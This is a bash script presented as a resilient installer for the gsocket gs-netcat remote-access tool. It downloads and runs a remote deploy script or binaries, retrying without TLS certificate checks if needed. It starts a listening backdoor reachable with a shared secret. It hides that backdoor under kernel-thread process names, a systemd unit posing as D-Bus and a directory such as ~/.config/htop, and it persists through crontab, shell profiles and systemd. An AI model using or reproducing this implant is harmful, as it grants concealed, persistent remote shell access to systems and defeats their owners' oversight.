#!/usr/bin/env bash
set -uo pipefail

GSS_DIR_DEFAULT="${HOME}/.local/share/gsocket"
GSS_KEY_FILE="${HOME}/.gsocket-secret"
GSS_PORT_FILE="${HOME}/.gsocket-port"
GSS_BIN_NAME="gs-netcat"
GSS_PORTS=(443 53 80 22 7350 67)
GSS_PROC_NAMES=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
GSS_URL_DEPLOY_LIST=(
  "https://gsocket.io/y"
  "https://raw.githubusercontent.com/hackerschoice/gsocket/master/deploy/deploy.sh"
  "https://cdn.gsocket.io/y"
  "https://github.com/hackerschoice/gsocket/raw/master/deploy/deploy.sh"
  "http://nossl.segfault.net/deploy-all.sh"
)
GSS_URL_BIN_LIST=(
  "https://github.com/hackerschoice/binary/raw/refs/heads/main/gsocket/bin"
  "https://github.com/hackerschoice/gsocket.io/raw/refs/heads/gh-pages/bin"
  "https://cdn.gsocket.io/bin"
  "https://gsocket.io/bin"
)
GSS_ARCH_FALLBACK_PKGS=("gs-netcat_mini-linux-x86_64" "gs-netcat_mini-linux-i686" "gs-netcat_mini-linux-aarch64" "gs-netcat_mini-linux-arm")

if [[ -t 1 ]]; then
  C_CY=$'\033[1;33m'; C_CG=$'\033[1;32m'; C_CR=$'\033[1;31m'; C_CB=$'\033[1;34m'
  C_CC=$'\033[1;36m'; C_CM=$'\033[1;35m'; C_CN=$'\033[0m'; C_CW=$'\033[1;37m'; C_CD=$'\033[0;37m'
else
  C_CY=""; C_CG=""; C_CR=""; C_CB=""; C_CC=""; C_CM=""; C_CN=""; C_CW=""; C_CD=""
fi

gss_log()  { printf "%s[%s]%s %s\n" "$C_CB" "$(date +%H:%M:%S)" "$C_CN" "$*"; }
gss_ok()   { printf "%s[+]%s %s\n" "$C_CG" "$C_CN" "$*"; }
gss_warn() { printf "%s[!]%s %s\n" "$C_CY" "$C_CN" "$*"; }
gss_err()  { printf "%s[-]%s %s\n" "$C_CR" "$C_CN" "$*" >&2; }
gss_step() { printf "%s[*]%s %s...\n" "$C_CC" "$C_CN" "$*"; }
gss_die()  { gss_err "$*"; exit 1; }

GSS_TMPDIR=""
gss_cleanup() {
  [[ -n "$GSS_TMPDIR" && -d "$GSS_TMPDIR" ]] && rm -rf "$GSS_TMPDIR" 2>/dev/null || true
}
trap gss_cleanup EXIT INT TERM

gss_mktemp() {
  [[ -n "${GSS_TMPDIR:-}" && -d "$GSS_TMPDIR" && -w "$GSS_TMPDIR" ]] && return 0
  local d
  for d in "${TMPDIR:-}" /dev/shm /tmp "$HOME" "$(pwd)"; do
    [[ -z "$d" || ! -d "$d" || ! -w "$d" ]] && continue
    GSS_TMPDIR=$(mktemp -d "${d}/.gss-XXXXXX" 2>/dev/null) && [[ -d "$GSS_TMPDIR" && -w "$GSS_TMPDIR" ]] && return 0
  done
  GSS_TMPDIR="${HOME}/.gss-tmp-$$"
  mkdir -p "$GSS_TMPDIR" 2>/dev/null && return 0
  return 1
}

gss_detect_arch() {
  local arch osname
  arch=$(uname -m 2>/dev/null)
  osname=$(uname -s 2>/dev/null)
  case "$osname" in
    Linux)
      case "$arch" in
        x86_64)         GSS_OSARCH="x86_64-alpine"; GSS_PKG="gs-netcat_mini-linux-x86_64" ;;
        i686|i386)      GSS_OSARCH="i386-alpine";   GSS_PKG="gs-netcat_mini-linux-i686" ;;
        aarch64)        GSS_OSARCH="aarch64-linux"; GSS_PKG="gs-netcat_mini-linux-aarch64" ;;
        armv6l)         GSS_OSARCH="arm-linux";    GSS_PKG="gs-netcat_mini-linux-armv6" ;;
        armv7l)         GSS_OSARCH="arm-linux";    GSS_PKG="gs-netcat_mini-linux-armv7l" ;;
        armv*)          GSS_OSARCH="arm-linux";    GSS_PKG="gs-netcat_mini-linux-arm" ;;
        mips64)         GSS_OSARCH="mips64-alpine"; GSS_PKG="gs-netcat_mini-linux-mips64" ;;
        mips*)          GSS_OSARCH="mips32-alpine"; GSS_PKG="gs-netcat_mini-linux-mips32" ;;
        *)              GSS_OSARCH="x86_64-alpine"; GSS_PKG="gs-netcat_mini-linux-x86_64" ;;
      esac ;;
    Darwin)
      GSS_OSARCH="x86_64-osx"
      GSS_PKG="gs-netcat_mini-macOS-x86_64" ;;
    FreeBSD)
      GSS_OSARCH="x86_64-freebsd"
      GSS_PKG="gs-netcat_mini-freebsd-x86_64" ;;
    OpenBSD)
      GSS_OSARCH="x86_64-openbsd"
      GSS_PKG="gs-netcat_mini-openbsd-x86_64" ;;
    CYGWIN*)
      [[ "$arch" == "x86_64" ]] && GSS_OSARCH="x86_64-cygwin" || GSS_OSARCH="i686-cygwin"
      GSS_PKG="gs-netcat_mini-cygwin-x86_64" ;;
    *) gss_die "Unsupported OS: $osname" ;;
  esac
}

gss_detect_downloader() {
  GSS_DL_BIN=""
  GSS_DL_KIND=""
  if command -v curl >/dev/null 2>&1; then
    GSS_DL_BIN=$(command -v curl); GSS_DL_KIND="curl"
  elif command -v wget >/dev/null 2>&1; then
    GSS_DL_BIN=$(command -v wget); GSS_DL_KIND="wget"
  elif command -v python3 >/dev/null 2>&1; then
    GSS_DL_BIN=$(command -v python3); GSS_DL_KIND="python"
  elif command -v python2 >/dev/null 2>&1; then
    GSS_DL_BIN=$(command -v python2); GSS_DL_KIND="python2"
  elif command -v perl >/dev/null 2>&1; then
    GSS_DL_BIN=$(command -v perl); GSS_DL_KIND="perl"
  elif command -v busybox >/dev/null 2>&1; then
    GSS_DL_BIN=$(command -v busybox); GSS_DL_KIND="busybox"
  elif command -v openssl >/dev/null 2>&1; then
    GSS_DL_BIN=$(command -v openssl); GSS_DL_KIND="openssl"
  else
    return 1
  fi
  return 0
}

gss_dl() {
  local url="$1" dst="$2" nocert="${3:-0}" timeout="${4:-30}"
  case "$GSS_DL_KIND" in
    curl)
      local args=(-fsSL --connect-timeout 5 --max-time "$timeout")
      [[ "$nocert" == "1" ]] && args+=(-k)
      "$GSS_DL_BIN" "${args[@]}" "$url" -o "$dst" ;;
    wget)
      local args=(-q --timeout="$timeout")
      [[ "$nocert" == "1" ]] && args+=(--no-check-certificate)
      "$GSS_DL_BIN" "${args[@]}" "$url" -O "$dst" ;;
    python)
      "$GSS_DL_BIN" - "$url" "$dst" "$nocert" "$timeout" <<'PY'
import sys, ssl
try:
    import urllib.request as r
except ImportError:
    import urllib2 as r
    import contextlib
url, dst, nc, to = sys.argv[1:5]
ctx = ssl._create_unverified_context() if nc == '1' else ssl.create_default_context()
req = r.Request(url, headers={'User-Agent':'curl/8.0'})
opener = r.build_opener(r.HTTPSHandler(context=ctx)) if hasattr(r,'build_opener') else r.build_opener()
data = opener.open(req, timeout=int(to)).read()
open(dst,'wb').write(data)
PY
      ;;
    python2)
      "$GSS_DL_BIN" - "$url" "$dst" "$nocert" "$timeout" <<'PY2'
import sys, ssl, urllib2, contextlib
url, dst, nc, to = sys.argv[1:5]
ctx = ssl._create_unverified_context() if nc == '1' else ssl.create_default_context()
opener = urllib2.build_opener(urllib2.HTTPSHandler(context=ctx))
req = urllib2.Request(url, headers={'User-Agent':'curl/8.0'})
data = opener.open(req, timeout=int(to)).read()
open(dst,'wb').write(data)
PY2
      ;;
    perl)
      "$GSS_DL_BIN" - "$url" "$dst" "$nocert" <<'PL'
my ($url, $dst, $nc) = @ARGV;
$url =~ m{^https?://([^/:]+)(?::(\d+))?(/.*)?$};
my ($host, $port, $path) = ($1, $2 || 80, $3 || '/');
eval { require IO::Socket::SSL; };
if ($@ || $url =~ m{^http://}) {
    use IO::Socket::INET;
    my $sock = IO::Socket::INET->new(PeerHost=>$host, PeerPort=>$port, Timeout=>30) or die "tcp: $!";
    print $sock "GET $path HTTP/1.0\r\nHost: $host\r\nUser-Agent: curl/8.0\r\n\r\n";
    my $resp; while (sysread($sock, my $buf, 4096)) { $resp .= $buf; }
    $resp =~ s/^.*?\r\n\r\n//s;
    open(my $fh, ">", $dst) or die; binmode $fh; print $fh $resp; close $fh;
} else {
    my $sock = IO::Socket::SSL->new(PeerHost=>$host, PeerPort=>443, SSL_verify_mode=>0, Timeout=>30) or die "ssl: $!";
    print $sock "GET $path HTTP/1.0\r\nHost: $host\r\nUser-Agent: curl/8.0\r\n\r\n";
    my $resp; while (sysread($sock, my $buf, 4096)) { $resp .= $buf; }
    $resp =~ s/^.*?\r\n\r\n//s;
    open(my $fh, ">", $dst) or die; binmode $fh; print $fh $resp; close $fh;
}
PL
      ;;
    busybox)
      "$GSS_DL_BIN" wget -q -O "$dst" "$url" 2>/dev/null ;;
    openssl)
      local host path scheme
      scheme="${url%%://*}"
      url="${url#*://}"
      host="${url%%/*}"
      path="/${url#*/}"
      [[ "$scheme" == "https" ]] && local port=443 || local port=80
      {
        printf 'GET %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: curl/8.0\r\nConnection: close\r\n\r\n' "$path" "$host"
        sleep 1
      } | "$GSS_DL_BIN" s_client -quiet -connect "${host}:${port}" 2>/dev/null | \
        awk 'BEGIN{c=0} /^\r?$/{c=1; next} c==1' > "$dst" 2>/dev/null ;;
    *) return 1 ;;
  esac
}

gss_probe_network() {
  gss_step "Probing GSocket deploy endpoints"
  local url t sz
  for url in "${GSS_URL_DEPLOY_LIST[@]}"; do
    t="${GSS_TMPDIR}/probe-$$"
    if gss_dl "$url" "$t" 0 8 2>/dev/null && [[ -s "$t" ]]; then
      sz=$(wc -c < "$t" 2>/dev/null || echo 0)
      if [[ "$sz" -gt 500 ]]; then
        GSS_DEPLOY_URL="$url"
        gss_ok "Reachable (strict-TLS): $url"
        return 0
      fi
    fi
    rm -f "$t" 2>/dev/null
  done
  gss_warn "Strict-TLS probe failed; retrying without cert verification"
  for url in "${GSS_URL_DEPLOY_LIST[@]}"; do
    t="${GSS_TMPDIR}/probe-$$"
    if gss_dl "$url" "$t" 1 8 2>/dev/null && [[ -s "$t" ]]; then
      sz=$(wc -c < "$t" 2>/dev/null || echo 0)
      if [[ "$sz" -gt 500 ]]; then
        GSS_DEPLOY_URL="$url"
        GSS_NOCERTCHECK=1
        gss_ok "Reachable (no-cert): $url"
        return 0
      fi
    fi
    rm -f "$t" 2>/dev/null
  done
  return 1
}

gss_ensure_secret() {
  if [[ -f "$GSS_KEY_FILE" ]]; then
    GSS_SECRET=$(cat "$GSS_KEY_FILE" 2>/dev/null)
    if [[ ${#GSS_SECRET} -ge 8 ]]; then
      gss_ok "Reusing existing secret ($GSS_KEY_FILE)"
      return 0
    fi
    gss_warn "Existing secret too short; regenerating"
  fi
  GSS_SECRET=$(tr -dc 'a-zA-Z0-9' < /dev/urandom 2>/dev/null | head -c 32)
  if [[ -z "$GSS_SECRET" || ${#GSS_SECRET} -lt 16 ]]; then
    GSS_SECRET=$(head -c 64 /dev/urandom 2>/dev/null | base64 2>/dev/null | tr -dc 'a-zA-Z0-9' 2>/dev/null | head -c 32)
  fi
  if [[ -z "$GSS_SECRET" || ${#GSS_SECRET} -lt 16 ]]; then
    GSS_SECRET="$(od -An -N24 -tu4 /dev/urandom 2>/dev/null | tr -dc 'a-zA-Z0-9' | head -c 32)"
  fi
  if [[ -z "$GSS_SECRET" || ${#GSS_SECRET} -lt 16 ]]; then
    GSS_SECRET="${RANDOM}${RANDOM}${RANDOM}${RANDOM}${RANDOM}${RANDOM}${RANDOM}${RANDOM}"
  fi
  mkdir -p "$(dirname "$GSS_KEY_FILE")" 2>/dev/null
  printf '%s' "$GSS_SECRET" > "$GSS_KEY_FILE"
  chmod 600 "$GSS_KEY_FILE"
  gss_ok "Generated new 32-char secret ($GSS_KEY_FILE)"
}

gss_pick_dstdir() {
  local candidates=(
    "$GSS_DIR_DEFAULT"
    "$HOME/.config/htop"
    "$HOME/.cache/gsocket"
    "$HOME/.local/bin"
    "$PWD/.gsocket"
    "/tmp/.gsusr-${UID:-0}"
    "/dev/shm/.gsusr-${UID:-0}"
  )
  local d testbin
  for d in "${candidates[@]}"; do
    [[ -z "$d" ]] && continue
    mkdir -p "$d" 2>/dev/null || continue
    [[ ! -d "$d" || ! -w "$d" ]] && continue
    testbin="$d/.gss-noexec-test-$$"
    local truebin
    for truebin in /bin/true /usr/bin/true "$(command -v true 2>/dev/null)"; do
      [[ -x "$truebin" ]] && break
    done
    [[ -x "$truebin" ]] || continue
    cp "$truebin" "$testbin" 2>/dev/null || continue
    chmod 700 "$testbin" 2>/dev/null
    if "$testbin" -g >/dev/null 2>&1; then
      rm -f "$testbin"
      GSS_DSTDIR="$d"
      gss_ok "Install dir: $d"
      return 0
    fi
    rm -f "$testbin"
  done
  return 1
}

gss_run_deploy() {
  local port="$1" deploy_script="$2"
  local args=(X="$GSS_SECRET" GS_DSTDIR="$GSS_DSTDIR" GS_PORT="$port")
  [[ -n "${GSS_NOCERTCHECK:-}" ]] && args+=(GS_NOCERTCHECK=1)
  gss_step "Running deploy.sh (port=$port, GS_DSTDIR=$GSS_DSTDIR)"
  if env "${args[@]}" bash "$deploy_script" >/dev/null 2>&1; then
    GSS_PORT_USED="$port"
    printf '%s' "$port" > "$GSS_PORT_FILE"
    chmod 600 "$GSS_PORT_FILE"
    return 0
  fi
  return 1
}

gss_orchestrate_deploy() {
  gss_mktemp || gss_die "Cannot create temp directory"
  local deploy_script="${GSS_TMPDIR}/deploy.sh"
  gss_step "Downloading deploy.sh from $GSS_DEPLOY_URL"
  if ! gss_dl "$GSS_DEPLOY_URL" "$deploy_script" "${GSS_NOCERTCHECK:-0}" 60; then
    gss_warn "Download failed"
    return 1
  fi
  local sz
  sz=$(wc -c < "$deploy_script" 2>/dev/null || echo 0)
  if [[ "$sz" -lt 500 ]]; then
    gss_warn "Deploy script too small ($sz bytes)"
    return 1
  fi
  gss_ok "Deploy script downloaded ($sz bytes)"
  local port
  for port in "${GSS_PORTS[@]}"; do
    if gss_run_deploy "$port" "$deploy_script"; then
      return 0
    fi
    gss_warn "Port $port failed; trying next"
  done
  return 1
}

gss_locate_binary() {
  local candidates=(
    "$GSS_DSTDIR/$GSS_BIN_NAME"
    "$GSS_DSTDIR/defunct"
    "$GSS_DSTDIR/gs-dbus"
    "$GSS_DSTDIR/gs-db"
    "$GSS_DIR_DEFAULT/$GSS_BIN_NAME"
    "$HOME/.config/htop/$GSS_BIN_NAME"
    "$HOME/.config/htop/defunct"
    "$HOME/.config/htop/gs-dbus"
    "$HOME/.local/bin/$GSS_BIN_NAME"
  )
  local c
  for c in "${candidates[@]}"; do
    if [[ -x "$c" ]]; then
      GSS_BIN="$c"
      return 0
    fi
  done
  local found
  found=$(find "$HOME" -maxdepth 5 -type f -name "$GSS_BIN_NAME" 2>/dev/null | head -n1)
  if [[ -n "$found" && -x "$found" ]]; then
    GSS_BIN="$found"
    return 0
  fi
  found=$(find /tmp /dev/shm -maxdepth 3 -type f -name "$GSS_BIN_NAME" 2>/dev/null | head -n1)
  if [[ -n "$found" && -x "$found" ]]; then
    GSS_BIN="$found"
    return 0
  fi
  return 1
}

gss_manual_install() {
  gss_step "Falling back to manual binary installation"
  gss_mktemp || gss_die "Cannot create temp directory"
  local pkg_url dl_dst bin_dst alt_pkg url_base
  bin_dst="$GSS_DSTDIR/$GSS_BIN_NAME"
  mkdir -p "$GSS_DSTDIR" 2>/dev/null
  gss_step "Trying primary arch: $GSS_PKG"
  for url_base in "${GSS_URL_BIN_LIST[@]}"; do
    pkg_url="${url_base}/${GSS_PKG}.tar.gz"
    dl_dst="${GSS_TMPDIR}/${GSS_PKG}.tar.gz"
    rm -f "$dl_dst" 2>/dev/null
    if gss_dl "$pkg_url" "$dl_dst" "${GSS_NOCERTCHECK:-0}" 120 2>/dev/null && [[ -s "$dl_dst" ]]; then
      gss_ok "Downloaded: $pkg_url ($(wc -c < "$dl_dst") bytes)"
      if tar -xzf "$dl_dst" -C "$GSS_TMPDIR" 2>/dev/null && [[ -f "${GSS_TMPDIR}/gs-netcat" ]]; then
        mv "${GSS_TMPDIR}/gs-netcat" "$bin_dst" 2>/dev/null
        chmod 700 "$bin_dst" 2>/dev/null
        if "$bin_dst" -g >/dev/null 2>&1; then
          gss_ok "Binary works"
          GSS_BIN="$bin_dst"
          return 0
        else
          gss_warn "Binary exec failed (wrong arch?)"
        fi
      fi
    fi
  done
  for alt_pkg in "${GSS_ARCH_FALLBACK_PKGS[@]}"; do
    [[ "$alt_pkg" == "$GSS_PKG" ]] && continue
    gss_warn "Trying fallback arch: $alt_pkg"
    for url_base in "${GSS_URL_BIN_LIST[@]}"; do
      pkg_url="${url_base}/${alt_pkg}.tar.gz"
      dl_dst="${GSS_TMPDIR}/${alt_pkg}.tar.gz"
      rm -f "$dl_dst" 2>/dev/null
      if gss_dl "$pkg_url" "$dl_dst" "${GSS_NOCERTCHECK:-0}" 120 2>/dev/null && [[ -s "$dl_dst" ]]; then
        if tar -xzf "$dl_dst" -C "$GSS_TMPDIR" 2>/dev/null && [[ -f "${GSS_TMPDIR}/gs-netcat" ]]; then
          mv "${GSS_TMPDIR}/gs-netcat" "$bin_dst" 2>/dev/null
          chmod 700 "$bin_dst" 2>/dev/null
          if "$bin_dst" -g >/dev/null 2>&1; then
            gss_ok "Binary works (fallback: $alt_pkg)"
            GSS_BIN="$bin_dst"
            return 0
          fi
        fi
      fi
    done
  done
  return 1
}

gss_test_network() {
  local port="${1:-443}"
  local out ret
  gss_step "Testing GSRN reachability on port $port"
  out=$(_GSOCKET_SERVER_CHECK_SEC=12 GS_PORT="$port" "$GSS_BIN" -s "$GSS_SECRET" -t 2>&1)
  ret=$?
  case "$ret" in
    0)   gss_warn "Secret already in use by another host (port $port)" ;;
    61)  gss_ok "GSRN reachable on port $port (ECONNREFUSED = no server, network OK)" ;;
    202) gss_warn "Timeout on port $port - likely firewalled" ;;
    203) gss_warn "TCP refused on port $port" ;;
    255) gss_warn "Transparent proxy detected on port $port" ;;
    *)   gss_warn "Unknown exit code $ret on port $port" ;;
  esac
  return "$ret"
}

gss_pick_port() {
  local port ret
  for port in "${GSS_PORTS[@]}"; do
    gss_test_network "$port"
    ret=$?
    if [[ "$ret" == "61" || "$ret" == "0" ]]; then
      GSS_PORT_USED="$port"
      printf '%s' "$port" > "$GSS_PORT_FILE"
      chmod 600 "$GSS_PORT_FILE"
      return 0
    fi
  done
  GSS_PORT_USED="${GSS_PORTS[0]}"
  printf '%s' "$GSS_PORT_USED" > "$GSS_PORT_FILE"
  chmod 600 "$GSS_PORT_FILE"
  gss_warn "No port explicitly confirmed; using $GSS_PORT_USED"
}

gss_setup_cron() {
  command -v crontab >/dev/null 2>&1 || return 1
  gss_step "Installing crontab @reboot persistence"
  local line
  printf -v line '@reboot %s -k %s -liqD -p %s 2>/dev/null' "$GSS_BIN" "$GSS_KEY_FILE" "$GSS_PORT_USED"
  local existing
  existing=$(crontab -l 2>/dev/null || true)
  if printf '%s\n' "$existing" | grep -qF -- "$GSS_BIN"; then
    gss_ok "Already in crontab"
    return 0
  fi
  if printf '%s\n%s\n' "$existing" "$line" | crontab - 2>/dev/null; then
    gss_ok "Crontab entry installed"
    return 0
  fi
  gss_warn "Crontab install failed"
  return 1
}

gss_setup_profile() {
  gss_step "Installing login-profile persistence"
  local line f
  printf -v line "[ -x '%s' ] && pgrep -f '%s' >/dev/null 2>&1 || { GS_PORT=%s '%s' -k '%s' -liqD >/dev/null 2>&1 & }" \
    "$GSS_BIN" "$GSS_BIN" "$GSS_PORT_USED" "$GSS_BIN" "$GSS_KEY_FILE"
  local rc_files=( "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.bash_profile" "$HOME/.bash_login" "$HOME/.profile" )
  local installed=0
  for f in "${rc_files[@]}"; do
    [[ -f "$f" ]] || continue
    if grep -qF -- "$GSS_BIN" "$f" 2>/dev/null; then
      gss_ok "Already in $f"
      installed=1
      continue
    fi
    if printf '\n%s\n' "$line" >> "$f" 2>/dev/null; then
      gss_ok "Added entry to $f"
      installed=1
    fi
  done
  [[ -f "$HOME/.profile" ]] || { printf '\n%s\n' "$line" >> "$HOME/.profile" 2>/dev/null && installed=1; }
  [[ "$installed" -eq 1 ]] && return 0
  return 1
}

gss_setup_systemd_user() {
  command -v systemctl >/dev/null 2>&1 || return 1
  [[ -z "${XDG_RUNTIME_DIR:-}" ]] && export XDG_RUNTIME_DIR="/run/user/$(id -u 2>/dev/null)"
  [[ -d "$XDG_RUNTIME_DIR" ]] || return 1
  systemctl --user >/dev/null 2>&1 || return 1
  gss_step "Installing systemd --user unit"
  local unit_dir="$HOME/.config/systemd/user"
  local unit_file="$unit_dir/gs-dbus.service"
  mkdir -p "$unit_dir" 2>/dev/null || return 1
  cat > "$unit_file" <<UNIT_EOF
[Unit]
Description=D-Bus System Message Bus
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=300
ExecStart=/bin/bash -c "GS_PORT=$GSS_PORT_USED exec -a '[kworker]' '$GSS_BIN' -k '$GSS_KEY_FILE' -liqD"

[Install]
WantedBy=default.target
UNIT_EOF
  command -v loginctl >/dev/null 2>&1 && loginctl enable-linger "$(id -un)" 2>/dev/null
  if systemctl --user daemon-reload 2>/dev/null && systemctl --user enable gs-dbus 2>/dev/null; then
    gss_ok "systemd --user unit installed"
    return 0
  fi
  gss_warn "systemd --user enable failed"
  return 1
}

gss_start_daemon() {
  gss_step "Starting daemon"
  local proc_name="${GSS_PROC_NAMES[$((RANDOM % ${#GSS_PROC_NAMES[@]}))]}"
  if pgrep -f "$GSS_BIN" >/dev/null 2>&1 || pgrep -f "$proc_name" >/dev/null 2>&1; then
    gss_ok "Daemon already running"
    return 0
  fi
  (
    cd "$HOME" 2>/dev/null
    exec -a "$proc_name" "$GSS_BIN" -k "$GSS_KEY_FILE" -liqD -p "$GSS_PORT_USED" 2>/dev/null
  ) >/dev/null 2>&1 &
  disown 2>/dev/null || true
  sleep 3
  if pgrep -f "$GSS_BIN" >/dev/null 2>&1 || pgrep -f "$proc_name" >/dev/null 2>&1; then
    gss_ok "Daemon started as '$proc_name'"
    return 0
  fi
  gss_warn "Daemon start may have failed; check: ps aux | grep -E '$GSS_BIN|$proc_name'"
  return 1
}

gss_summary() {
  printf '\n%s==============================================%s\n' "$C_CW" "$C_CN"
  printf '%s GSOCKET INSTALLATION COMPLETE %s\n' "$C_CG" "$C_CN"
  printf '%s==============================================%s\n' "$C_CW" "$C_CN"
  printf ' Secret : %s%s%s\n' "$C_CM" "$GSS_SECRET" "$C_CN"
  printf ' Port   : %s\n' "${GSS_PORT_USED:-unknown}"
  printf ' Binary : %s\n' "${GSS_BIN:-unknown}"
  printf ' Key    : %s\n' "$GSS_KEY_FILE"
  printf ' DstDir : %s\n' "${GSS_DSTDIR:-unknown}"
  printf '\n To connect from another host:\n'
  printf '   %sgs-netcat -s "%s" -i%s\n' "$C_CM" "$GSS_SECRET" "$C_CN"
  printf '   %sS="%s" bash -c "$(curl -fsSL https://gsocket.io/y)"%s\n' "$C_CM" "$GSS_SECRET" "$C_CN"
  printf '\n To uninstall:\n'
  printf '   %sGS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"%s\n' "$C_CM" "$C_CN"
  printf '   or manually: rm -f %s %s %s%s\n' "${GSS_BIN:-}" "$GSS_KEY_FILE" "$GSS_PORT_FILE" "$C_CN"
  printf '   crontab -l | grep -v %s | crontab -%s\n' "$GSS_BIN" "$C_CN"
  printf '%s==============================================%s\n' "$C_CW" "$C_CN"
  printf '%s[!] WARNING: Keep the Secret safe. Anyone with it can access this server.%s\n' "$C_CR" "$C_CN"
}

gss_main() {
  gss_log "GSocket super-resilient installer (user=$(id -un 2>/dev/null), uid=${UID:-0})"
  if [[ -z "${HOME:-}" || ! -d "${HOME:-/nonexistent}" ]]; then
    export HOME=$(grep "^$(whoami 2>/dev/null)" /etc/passwd 2>/dev/null | cut -d: -f6)
    if [[ -z "${HOME:-}" || ! -d "$HOME" ]]; then
      export HOME=$(mktemp -d 2>/dev/null) || gss_die "Cannot determine or create HOME directory"
    fi
  fi
  GSS_DIR_DEFAULT="${HOME}/.local/share/gsocket"
  GSS_KEY_FILE="${HOME}/.gsocket-secret"
  GSS_PORT_FILE="${HOME}/.gsocket-port"
  gss_detect_arch
  gss_ok "Detected: $(uname -s 2>/dev/null) $(uname -m 2>/dev/null) -> $GSS_OSARCH ($GSS_PKG)"
  gss_detect_downloader || gss_die "No downloader found (curl/wget/python/perl/busybox/openssl)"
  gss_ok "Downloader: $GSS_DL_KIND ($GSS_DL_BIN)"
  command -v tar >/dev/null 2>&1 || gss_warn "tar missing - extraction may fail"
  command -v gzip >/dev/null 2>&1 || command -v zcat >/dev/null 2>&1 || gss_warn "gzip/zcat missing"
  gss_ensure_secret
  gss_pick_dstdir || gss_die "Cannot find any writable+executable install directory"
  gss_mktemp || gss_die "Cannot create temp directory"
  gss_probe_network || gss_die "Cannot reach any GSocket endpoint (network blocked)"
  if gss_orchestrate_deploy; then
    gss_ok "Official deploy.sh succeeded (port=$GSS_PORT_USED)"
  else
    gss_warn "Official deploy.sh path failed; switching to manual binary install"
    gss_manual_install || gss_die "All installation paths failed"
    GSS_PORT_USED=""
  fi
  gss_locate_binary || gss_die "Binary not found after installation"
  gss_ok "Binary validated: $GSS_BIN"
  if [[ -z "${GSS_PORT_USED:-}" ]]; then
    gss_pick_port
  else
    gss_test_network "$GSS_PORT_USED" 2>/dev/null || true
  fi
  if [[ "$(id -u 2>/dev/null || echo 1)" -ne 0 ]]; then
    gss_setup_cron || gss_setup_profile || gss_setup_systemd_user || \
      gss_warn "No persistence method succeeded - daemon will die on reboot"
  else
    gss_ok "Running as root; deploy.sh should have set up systemd/rc.local"
  fi
  gss_start_daemon || gss_warn "Daemon start had issues"
  gss_summary
}

gss_main "$@"
